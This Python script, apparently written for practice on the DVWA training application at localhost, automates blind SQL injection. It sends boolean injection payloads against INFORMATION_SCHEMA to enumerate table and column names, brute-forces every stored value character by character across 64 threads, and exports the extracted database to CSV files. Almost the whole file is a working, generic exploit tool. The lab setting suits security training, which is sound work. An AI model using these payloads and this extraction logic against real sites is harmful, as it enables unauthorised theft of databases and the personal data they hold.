"""
Note: this script assume all values are unique; which in real conditions is not always the case
it is possible to map values with another script in order to find duplicates values; not shown here
This script can be improved by implementing a dichotomic search algorithm
Created on Sun Feb 25 01:32:38 2024

@author: Alexandre Maurin
"""
verbose = True
from dvwa_wrapper import dvwa
import utils
import string
from queue import Queue
import threading

dvwa_instance = dvwa("https://localhost") #host here
dvwa_instance.makeSession()
dvwa_instance.createDatabase()
#we might need to login again after creating the database
dvwa_instance.makeSession()

#common special chars
spec_chars = "-@_"
#database is not case sensitive, change lowercase to all characters if different
VALID_CHARS = list(string.ascii_lowercase + string.digits + spec_chars) # we want to keep this not too big to save search time

##number of worker threads, lower this value to avoid problem of too many files opened or too many sockets running at once.
# HOW TO CHOOSE THIS VALUE:
# usually you will hear blablabla use the same number of core your machine has
# this is a bad misconception, it depends of the use case. Here we are doing web request with
# lot of idle time waiting for the server to answer, therefore we can reduce this idle time by running 
# more concurrent threads than the number of cores available, however it's important to keep 2 things in mind:
# - You're opening a new connection for each request, you're limited by the number of ports available
# - You're dealing with a server and making sql queries that can be costly, you do not want to DOS the server ;)
# 256 threads is the limit I would recommend, but you could theorically run up to 64k (65535 ports - 1024 reserved)
# threads, however you're definitely going to run into problems.
##
MAX_THREADS = 64

###QUERIES###
TABLE_QUERY = ("1' AND 0<>(SELECT COUNT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE table_name LIKE '{}%') -- ",
               "1' AND 0<>(SELECT COUNT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE table_name = '{}') -- ")
COLUMN_QUERY = ("1' AND 0<>(SELECT COUNT(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE column_name LIKE '{}%') -- ",
                "1' AND 0<>(SELECT COUNT(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE column_name = '{}') -- ")

queue = Queue()


def sqli_query(query:str) -> bool:
    r = dvwa_instance.session.get(dvwa_instance.BLIND_SQLI_PATH, params={'id':query, 'Submit':'Submit'})
    if r.status_code == 200:
        return True
    return False

def sqli_confirm(e:str, query:str, data:list) -> bool:
    if sqli_query(query.format(e)):
        if verbose: print(e)
        data.append(e)
        return True
    return False
        
def sqli_job(e:str, query:str, confirm_query:str, data:list) -> None:
    if sqli_query(query.format(e.replace("_","\_"))): # _ is a wildcard for the LIKE operator, therefore we should escape it
        sqli_producer(e, query, confirm_query, data)
        sqli_confirm(e, confirm_query, data)
        
        
def sqli_producer(e:str, query:str, confirm_query:str, data:list) -> None:
    for c in VALID_CHARS:
        queue.put((sqli_job, e+c, query, confirm_query, data))

def getAllTables() -> list:
    tables = []
    sqli_producer("", TABLE_QUERY[0], TABLE_QUERY[1], tables)
    return tables

def getAllColumns() -> list:
    columns = []
    sqli_producer("", COLUMN_QUERY[0], COLUMN_QUERY[1], columns)
    return columns

def getAllValues(column:str, table:str) -> list:
    values = []
    query = f"1' AND 0<>(SELECT COUNT({column}) FROM {table} WHERE {column} LIKE" + " '{}%') -- "
    confirm_query = f"1' AND 0<>(SELECT COUNT({column}) FROM {table} WHERE {column} =" + " '{}') -- "
    sqli_producer("", query, confirm_query, values)
    return values

def isColumnInTable(column:str, table:str) -> bool:
    return sqli_query(f"1' AND 0<>(SELECT COUNT(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '{table}' AND COLUMN_NAME = '{column}') -- ")

def tcv_mapper(table:str, column:str, data:dict) -> None:
    """table<-colums<-values mapper"""
    if isColumnInTable(column, table):
        if verbose: print(f"{column} is in {table}")
        data[table][column] = getAllValues(column, table)
        #if verbose: print(f"{table}->{column}::\n", data[table][column])


def worker():
    while True:
        task = queue.get()
        func = task[0]
        args = task[1:]
        func(*args)
        queue.task_done()


if __name__ == "__main__":
    for _ in range(MAX_THREADS): threading.Thread(target=worker, daemon=True).start()
    if verbose: print("Getting tables:")
    tables = getAllTables()
    queue.join()
    if verbose: print("\nGetting columns:")
    columns = getAllColumns()
    queue.join()
    if verbose: print(f"\nFound {len(tables)} tables and {len(columns)} columns")
    if verbose: print("\nArranging columns to corresponding tables and mapping values..")
    data = {table:dict() for table in tables}
    for column in columns:
        for table in tables:
            queue.put((tcv_mapper, table, column, data))
    queue.join()
    
    n = 3
    top = utils.top_sort(data)
    print(f"Top {n} tables with the most rows::")
    for i, table in enumerate(top):
        if i == n: break
        print(f"{table}: {top[table]} rows")
                
    for table in data.keys():
        utils.table2csv(data[table], "output/", table)
    print("finished extracting database.")

#' or '.join([f"column_name LIKE '{c}%'" for c in chars])
    
    